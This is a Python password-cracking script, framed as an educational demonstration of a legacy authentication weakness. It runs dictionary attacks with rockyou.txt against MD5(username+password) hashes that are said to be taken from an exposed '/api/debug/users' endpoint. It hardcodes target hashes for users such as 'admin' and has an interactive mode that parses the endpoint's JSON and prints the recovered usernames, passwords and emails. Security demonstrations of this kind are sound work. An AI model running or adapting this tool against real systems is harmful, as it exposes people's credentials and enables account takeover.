#!/usr/bin/env python3
"""
MD5 Hash Cracker for Legacy Authentication System
Cracks MD5 hashes that use username as salt (format: MD5(username + password))
Educational tool for demonstrating weak password hashing vulnerabilities.
"""

import hashlib
import time
import json
from typing import List, Optional, Dict

def md5_hash(username: str, password: str) -> str:
    """Generate MD5 hash using username + password format"""
    return hashlib.md5((username + password).encode()).hexdigest()

def load_password_list(filename: str) -> List[str]:
    """Load passwords from a file, one per line"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def generate_common_passwords() -> List[str]:
    """Generate a list of common passwords for testing"""
    return [
    ]

def crack_hash(target_hash: str, username: str, wordlist: List[str]) -> Optional[str]:
    """
    Attempt to crack an MD5 hash using the given wordlist
    Returns the password if found, None otherwise
    """
    print(f"Attempting to crack hash: {target_hash}")
    print(f"Username (salt): {username}")
    print(f"Testing {len(wordlist)} passwords...")
    print("-" * 50)
    
    start_time = time.time()
    
    for i, password in enumerate(wordlist, 1):
        # Calculate hash for this password attempt
        attempt_hash = md5_hash(username, password)
        
        # Show progress every 10000 attempts for large wordlists
        progress_interval = 10000 if len(wordlist) > 50000 else 1000
        if i % progress_interval == 0:
            elapsed = time.time() - start_time
            rate = i / elapsed if elapsed > 0 else 0
            progress_pct = (i / len(wordlist)) * 100
            print(f"Progress: {i:,}/{len(wordlist):,} ({progress_pct:.1f}%) - {rate:.0f} hashes/sec")
        
        # Check if we found a match
        if attempt_hash == target_hash:
            elapsed = time.time() - start_time
            print(f"\n🎉 SUCCESS! Password cracked in {elapsed:.2f} seconds")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print(f"Hash: {target_hash}")
            print(f"Verification: MD5('{username}' + '{password}') = {attempt_hash}")
            return password
    
    elapsed = time.time() - start_time
    print(f"\n❌ Password not found after testing {len(wordlist):,} passwords in {elapsed:.2f} seconds")
    return None

def demonstrate_vulnerability():
    """Demonstrate the vulnerability using real hashes from debug endpoint"""
    print("=" * 60)
    print("MD5 HASH CRACKING DEMONSTRATION")
    print("Legacy Authentication System Vulnerability")
    print("=" * 60)
    
    # Real hashes from the debug endpoint - no knowledge of passwords
    target_users = [
        {"username": "admin", "hash": "172eee54aa664e9dd0536b063796e54e"},
        {"username": "demo", "hash": "c514c91e4ed341f263e458d44b3bb0a7"},
        {"username": "test.user", "hash": "3cbd90f69e8edaacaf1962ffae7b0588"},
        {"username": "alice", "hash": "69188075f1298a36bc85660cbfa8a272"},
        {"username": "bob", "hash": "7bf9cb12f232a2291d7b2cd738e8bcde"},
    ]
    
    print("\nTarget hashes from debug endpoint:")
    print("-" * 60)
    for user in target_users:
        print(f"User: {user['username'].ljust(12)} | Hash: {user['hash']}")
    
    # Load wordlist
    wordlist_file = "rockyou.txt"
    wordlist = load_password_list(wordlist_file)
    
    if not wordlist:
        print(f"rockyou.txt not found, trying passwords.txt...")
        wordlist = load_password_list("passwords.txt")
    
    if not wordlist:
        print(f"No wordlist file found, using built-in common passwords.")
        wordlist = generate_common_passwords()
    else:
        print(f"Loaded {len(wordlist):,} passwords from {wordlist_file}")
        # Add common passwords to improve success rate
        built_in = generate_common_passwords()
        wordlist.extend(built_in)
        wordlist = list(set(wordlist))  # Remove duplicates
        print(f"Total unique passwords after adding common passwords: {len(wordlist):,}")
    
    # Attempt to crack multiple hashes
    print(f"\n" + "=" * 60)
    print("ATTEMPTING TO CRACK HASHES...")
    print("=" * 60)
    
    cracked_count = 0
    for user in target_users:
        print(f"\n{'='*40}")
        print(f"Targeting user: {user['username']}")
        print(f"{'='*40}")
        
        result = crack_hash(user['hash'], user['username'], wordlist)
        if result:
            cracked_count += 1
    
    # Summary
    print(f"\n" + "=" * 60)
    print("CRACKING RESULTS SUMMARY")
    print("=" * 60)
    print(f"Successfully cracked: {cracked_count}/{len(target_users)} passwords")
    
    if cracked_count > 0:
        print(f"\n✅ VULNERABILITY CONFIRMED!")
        print(f"✅ MD5 with username salt is vulnerable to dictionary attacks")
        print(f"✅ Debug endpoint exposure makes this attack feasible")
        print(f"✅ Weak passwords in rockyou.txt wordlist were successfully cracked")
    else:
        print(f"\n⚠️  No passwords cracked with current wordlist")
        print(f"⚠️  Users may have stronger passwords or wordlist may be incomplete")

def parse_debug_json(json_data: str) -> List[Dict[str, str]]:
    """Parse JSON data from debug endpoint and extract user/hash pairs"""
    try:
        data = json.loads(json_data)
        users = []
        for user in data.get('users', []):
            users.append({
                'username': user.get('username', ''),
                'hash': user.get('password_hash', ''),
                'email': user.get('email', '')
            })
        return users
    except json.JSONDecodeError as e:
        print(f"❌ Invalid JSON data: {e}")
        return []

def crack_all_from_json():
    """Parse debug endpoint JSON and crack all hashes"""
    print("\n" + "=" * 60)
    print("CRACK ALL HASHES FROM DEBUG ENDPOINT")
    print("=" * 60)
    
    print("Paste the JSON data from /api/debug/users endpoint:")
    print("(Paste the entire JSON response and press Enter twice)")
    
    lines = []
    while True:
        try:
            line = input()
            if line.strip() == "" and lines:
                break
            lines.append(line)
        except KeyboardInterrupt:
            print("\nOperation cancelled.")
            return
    
    json_data = '\n'.join(lines)
    users = parse_debug_json(json_data)
    
    if not users:
        print("❌ No valid user data found in JSON")
        return
    
    print(f"\n✅ Parsed {len(users)} users from debug endpoint")
    
    # Load wordlist
    wordlist = load_password_list("rockyou.txt")
    if not wordlist:
        wordlist = load_password_list("passwords.txt")
    if not wordlist:
        wordlist = generate_common_passwords()
    else:
        wordlist.extend(generate_common_passwords())
        wordlist = list(set(wordlist))
    
    print(f"Using wordlist with {len(wordlist):,} unique passwords\n")
    
    # Crack each hash
    cracked = []
    for user in users:
        print(f"{'='*50}")
        print(f"Targeting: {user['username']} ({user['email']})")
        print(f"{'='*50}")
        
        result = crack_hash(user['hash'], user['username'], wordlist)
        if result:
            cracked.append({
                'username': user['username'],
                'password': result,
                'email': user['email']
            })
    
    # Summary
    print(f"\n" + "=" * 60)
    print("FINAL RESULTS")
    print("=" * 60)
    print(f"Successfully cracked: {len(cracked)}/{len(users)} passwords\n")
    
    if cracked:
        print("Cracked credentials:")
        print("-" * 40)
        for cred in cracked:
            print(f"Username: {cred['username'].ljust(12)} | Password: {cred['password'].ljust(15)} | Email: {cred['email']}")
        print(f"\n✅ ATTACK SUCCESSFUL! Debug endpoint vulnerability exploited.")
    else:
        print("⚠️  No passwords were cracked with the current wordlist.")

def interactive_mode():
    """Interactive mode for manual hash cracking"""
    print("\n" + "=" * 60)
    print("INTERACTIVE HASH CRACKING MODE")
    print("=" * 60)
    
    while True:
        print(f"\nOptions:")
        print(f"1. Crack a single hash manually")
        print(f"2. Crack all hashes from debug JSON")
        print(f"3. Generate hash for testing")
        print(f"4. Exit")
        
        choice = input("\nSelect option (1-4): ").strip()
        
        if choice == "1":
            target_hash = input("Enter MD5 hash to crack: ").strip().lower()
            username = input("Enter username (salt): ").strip()
            
            if len(target_hash) != 32:
                print("❌ Invalid hash length. MD5 hashes are 32 characters.")
                continue
            
            # Load wordlist (prioritize rockyou.txt)
            wordlist = load_password_list("rockyou.txt")
            if not wordlist:
                print("rockyou.txt not found, trying passwords.txt...")
                wordlist = load_password_list("passwords.txt")
            if not wordlist:
                print("No wordlist files found, using built-in passwords.")
                wordlist = generate_common_passwords()
            else:
                # Add built-in passwords for better coverage
                wordlist.extend(generate_common_passwords())
                wordlist = list(set(wordlist))
                print(f"Using wordlist with {len(wordlist):,} unique passwords")
            
            crack_hash(target_hash, username, wordlist)
            
        elif choice == "2":
            crack_all_from_json()
            
        elif choice == "3":
            username = input("Enter username: ").strip()
            password = input("Enter password: ").strip()
            hash_value = md5_hash(username, password)
            print(f"\nGenerated hash:")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print(f"MD5 Hash: {hash_value}")
            
        elif choice == "4":
            print("Goodbye!")
            break
        else:
            print("❌ Invalid choice. Please select 1-4.")

if __name__ == "__main__":
    # Run demonstration first
    demonstrate_vulnerability()
    
    # Then provide interactive mode
    interactive_mode()